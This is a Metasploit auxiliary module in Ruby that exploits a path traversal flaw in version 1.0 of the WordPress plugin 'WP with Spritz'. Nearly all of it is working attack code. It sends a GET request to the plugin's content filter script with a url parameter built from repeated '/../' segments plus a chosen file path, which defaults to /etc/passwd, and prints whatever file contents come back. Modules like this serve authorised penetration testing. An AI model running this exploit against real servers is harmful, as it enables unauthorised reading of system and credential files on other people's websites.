##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Plugin WP with Spritz 1.0',
      'Description'    => %q{
        This is module exploit a Path Transversal in wordpress plugin "WP with Spritz" at version 1.0
      },
      'References'     =>
        [
          ['EDB', '44544']
        ],
      'Author'         =>
        [
          'Wadeek', # Vulnerability discovery
          'Mateus Lino <dctoralves[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path ', '/etc/passwd']),
        OptInt.new('DEPTH', [true, 'Traversal Depth ', 4 ])
      ])
  end
 def run_host(ip)
    traversal = "/../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(wordpress_url_plugins, 'wp-with-spritz', 'wp.spritz.content.filter.php'),
      'vars_get'  =>
        {
          'url'   => "#{traversal}#{filename}"
        })
if res.code == 200
 print_good("Path Exploitable:")
 print_status(res.body)
else
 print_error("Nothing was found.")
end
  end
end
